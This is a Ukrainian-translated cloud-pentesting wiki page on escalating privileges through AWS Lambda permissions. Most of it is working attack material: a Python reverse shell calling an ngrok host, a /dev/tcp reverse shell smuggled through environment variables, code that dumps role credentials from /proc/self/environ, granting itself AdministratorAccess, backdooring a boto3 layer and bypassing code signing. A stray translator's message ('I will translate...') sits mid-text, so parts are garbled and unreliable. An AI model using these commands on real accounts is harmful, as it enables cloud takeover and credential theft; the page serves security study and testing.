# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

Детальніше про lambda у:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Користувачі з дозволами **`iam:PassRole`, `lambda:CreateFunction`, та `lambda:InvokeFunction`** можуть підвищити свої привілеї.\
Вони можуть **створити нову Lambda function і призначити їй існуючу IAM role**, надаючи функції права, пов'язані з цією роллю. Користувач може потім **написати та завантажити код у цю Lambda function (наприклад, з rev shell)**.\
Після налаштування функції користувач може **ініціювати її виконання** та виконати потрібні дії, викликавши Lambda function через AWS API. Такий підхід дозволяє користувачу опосередковано виконувати завдання через Lambda function, діючи з рівнем доступу, наданим пов'язаною IAM role.\\

Атакуючий може зловживати цим, щоб отримати **rev shell і вкрасти token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Ви також можете **зловживати дозволами ролі lambda** безпосередньо з самої функції lambda.\
Якщо роль lambda має достатні дозволи, ви можете використати її, щоб надати собі права адміністратора:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Також можливо leak облікові дані ролі lambda без потреби у зовнішньому підключенні. Це буде корисно для **Network isolated Lambdas**, які використовуються для внутрішніх завдань. Якщо невідомі security groups фільтрують ваші reverse shells, цей фрагмент коду дозволить безпосередньо leak облікові дані як вивід lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potential Impact:** Пряме privesc до довільної ролі сервісу lambda, що вказана.

> [!CAUTION]
> Зверніть увагу, що хоч **`lambda:InvokeAsync`** може виглядати цікавим, воно саме по собі **не дозволяє** виконати **`aws lambda invoke-async`** — потрібен також дозвіл `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Як і в попередньому сценарії, ви можете **надати собі дозвіл `lambda:InvokeFunction`**, якщо маєте дозвіл **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Прямий privesc до довільної вказаної ролі сервісу Lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Користувачі з **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** дозволами (а також, можливо, `dynamodb:PutItem` та `dynamodb:CreateTable`) можуть опосередковано **escalate privileges** навіть без `lambda:InvokeFunction`.\
Вони можуть створити **Lambda function з шкідливим кодом і призначити їй існуючу IAM role**.

Замість безпосереднього виклику Lambda, користувач налаштовує або використовує існуючу таблицю DynamoDB, пов’язуючи її з Lambda через event source mapping. Ця конфігурація гарантує, що Lambda function **автоматично запускається при додаванні нового елемента** до таблиці, чи то внаслідок дії користувача, чи іншого процесу, тим самим опосередковано викликаючи Lambda function і виконуючи код з дозволами переданої IAM role.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Якщо DynamoDB вже активний в середовищі AWS, користувачеві потрібно лише **встановити event source mapping** для функції Lambda. Однак, якщо DynamoDB не використовується, користувач повинен **створити нову таблицю** з увімкненими Streams:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Тепер можна **підключити Lambda function до DynamoDB table** шляхом **створення event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Якщо функція Lambda пов'язана з потоком DynamoDB, зловмисник може **опосередковано запустити Lambda, активувавши потік DynamoDB**. Це можна зробити, **вставивши елемент** у таблицю DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** Пряме privesc до зазначеної lambda service role.

### `lambda:AddPermission`

attacker з цим дозволом може **надавати собі (або іншим) будь-які дозволи** (це створює resource based policies для надання доступу до ресурсу):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potential Impact:** Пряме privesc до ролі сервісу lambda, що використовується, шляхом надання дозволу змінювати код та запускати його.

### `lambda:AddLayerVersionPermission`

Зловмисник з цим дозволом може **надавати собі (або іншим) дозвіл `lambda:GetLayerVersion`**. Він може отримати доступ до шару та шукати вразливості або конфіденційну інформацію
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** Можливий доступ до конфіденційної інформації.

### `lambda:UpdateFunctionCode`

Користувачі, які мають **`lambda:UpdateFunctionCode`** дозвіл, можуть **змінити код існуючої Lambda-функції, що пов'язана з IAM role.**\
Зловмисник може **змінити код Lambda, щоб екзфільтрувати облікові дані IAM**.

Хоча зловмисник може не мати прямої можливості викликати функцію, якщо Lambda-функція вже існує та працює, ймовірно, вона буде запускатися через існуючі робочі процеси або події, що опосередковано дозволить виконати змінений код.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Можливий вплив:** Пряме privesc до ролі сервісу lambda, що використовується.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Маючи ці дозволи, можна додати environment variables, які призведуть до виконання Lambda довільного коду. Наприклад, у python можна зловживати змінними середовища `PYTHONWARNING` та `BROWSER`, щоб змусити python-процес виконувати довільні команди:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Для інших скриптових мов існують інші змінні середовища (env variables), які ви можете використовувати. Для додаткової інформації перегляньте підрозділи про скриптові мови у:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) дозволяє включати **code** в вашу lamdba функцію, але **зберігати його окремо**, тож код функції може залишатися невеликим і **кілька функцій можуть ділитися кодом**.

Всередині lambda ви можете перевірити шляхи, звідки завантажується python code, за допомогою функції на кшталт наступної:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Exploitation

It's possible to abuse the permission `lambda:UpdateFunctionConfiguration` to **add a new layer** to a lambda function. To execute arbitrary code this layer need to contain some **library that the lambda is going to import.** If you can read the code of the lambda, you could find this easily, also note that it might be possible that the lambda is **already using a layer** and you could **download** the layer and **add your code** in there.

For example, lets suppose that the lambda is using the library boto3, this will create a local layer with the last version of the library:
```bash
pip3 install -t ./lambda_layer boto3
```
Ви можете відкрити `./lambda_layer/boto3/__init__.py` і **додати backdoor у глобальний код** (наприклад, функцію для exfiltrate credentials або отримання reverse shell).

Потім заархівуйте директорію `./lambda_layer` і **завантажте новий lambda layer** у свій акаунт (або в акаунт жертви, але можливо у вас немає на це прав).\
Зверніть увагу, що потрібно створити папку python і помістити туди бібліотеки, щоб перевизначити /opt/python/boto3. Також layer має бути **compatible with the python version** яку використовує lambda, і якщо ви завантажуєте його у свій акаунт, він має бути в **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Тепер зробіть завантажений lambda layer **доступним для будь-якого облікового запису**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
І прикріпіть lambda layer до victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Наступним кроком буде або **викликати функцію** самому, якщо це можливо, або почекати, поки **вона буде викликана** звичайним способом — що є безпечнішим методом.

Більш прихований спосіб експлуатації цієї вразливості можна знайти в:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** Прямий privesc до ролі сервісу lambda, що використовується.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Можливо, з такими дозволами ви зможете створити функцію і виконати її, викликавши URL... але я не знайшов способу протестувати це, тому дайте знати, якщо вам вдасться!

### Lambda MitM

Деякі lambda будуть **отримувати конфіденційні дані від користувачів у параметрах.** Якщо отримати RCE в одній з них, ви можете exfiltrate інформацію, яку інші користувачі надсилають до неї; див.:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Посилання

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Обхід підписування коду для Lambda

Якщо функція Lambda вимагає підписування коду, нападник, який може видалити Code Signing Config (CSC) або понизити його до Warn, може розгорнути неподписаний код у функцію. Це обходить захист цілісності без зміни IAM ролі функції або її тригерів.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Примітки:
- Для Path B вам не потрібен профіль AWS Signer, якщо політика CSC встановлена на `WARN` (дозволені неподписані артефакти).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Підготуйте невеликий payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Path A) Видалити CSC, потім оновити код:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Шлях B) Знизити до Warn і оновити код (якщо delete не дозволено):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Підтверджую: я перекладу релевантний англійський текст файлу src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc.md українською, зберігаючи точно ту ж саму markdown та HTML синтакси. Не перекладатиму:
- код,
- імена технік і загальні hacking-слова,
- назви платформ/сервісів (наприклад aws, gcp, Workspace),
- слова "leak", "pentesting",
- посилання, шляхи та ref/теги типу {#tabs}, {#ref} і т. ін.

Також не додаватиму жодного зайвого вмісту поза перекладом.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Потенційний вплив: Здатність завантажувати та виконувати довільний непідписаний код у функції, яка мала забезпечувати виконання лише підписаних розгортань, що може призвести до виконання коду з дозволами ролі функції.

Очищення:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

